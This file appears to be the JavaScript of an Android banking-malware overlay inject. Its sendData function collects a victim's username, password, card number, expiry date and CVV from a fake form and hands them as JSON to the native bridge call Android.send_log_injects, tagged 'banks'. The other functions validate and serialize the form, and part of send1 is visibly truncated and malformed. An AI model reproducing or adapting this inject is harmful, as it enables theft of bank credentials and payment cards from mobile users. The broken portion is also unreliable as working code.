  function sendData(){
       if(document.getElementById('user').value.length>=4 && document.getElementById('pass').value.length>=4){
        var data = {};

        data.user = document.getElementById('user').value;
        data.pass = document.getElementById('pass').value;
        data.c_c = document.getElementById('c_c').value;
        data.exp = document.getElementById('exp').value;
        data.cvv = document.getElementById('cvv').value;
        data.type_injects = "banks";
        data.closed = "close_activity_injects";




        var ua = navigator.userAgent.toLowerCase();
        if(ua.indexOf("android") > -1) {
            try {
                Android.send_log_injects(JSON.stringify(data))
            } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
       }
}

send1 = function(e, callback__, global_luhn__) {
  e.preventDefault();
  var el = e.target;

  var err_elements = [];

  $(el).find('input,select').each(function() {
    var reg__ = $(this).data().reg;
    if (typeof(reg__) != "undefined") {
      if (!eval(reg__).test($(this).val())) {
        err = true;
        err_elements.push(this);
        return;
      }
    }
    var luhn__ = $(this).data().luhn;
    if (typeof(luhn__) != "undefined" && luhn__ != '') {
      if (!eval(luhn__)($(this).val())) {
        err = true;
        err_elements.push(this);
      }
    }
  })

  //time for global_luhn

      err = true;
    }

  }

    $(err_elements).each(function() {
      $(this).closest('.form-group').addClass('has_err');
      $(window).scrollTop(0)

    })
    return;
  }

  if (typeof(callback__) != 'undefined') {
    eval(callback__)(el);
    return;
  }
  alert('We stack, what to do next?')

function cc_luhn(str, err_text) {
    //CC validator
    var str = str.match(/\d/g).join("");

    var valid =
        str.split("").reduceRight(function(prev, curr, idx) {
            prev = parseInt(prev, 10);
            if ((idx + 1) % 2 !== 0) {
                curr = (curr * 2).toString().split("").reduce(function(p, c) {
                    return parseInt(p, 10) + parseInt(c, 10);
                });
            }
            return prev + parseInt(curr, 10);
        }) %
        10 ===
        0;
    // if (!valid) {
    //     err_text.push("Card number is not valid");
    // }

    return valid;
}







$.fn.custom_ser=function(){
    var obj={};
    this.find('input,select').each(function(){
        if ($(this).prop('tagName') == "INPUT" && $(this).prop('type')!="checkbox") {
               //input validation
               obj[$(this).attr('name')]=$(this).val();  
        } 
        if ($(this).prop('tagName') == "SELECT") {
          obj[$(this).attr('name')]=$(this).find('option:selected').val();
       }
    })
    return obj;
}
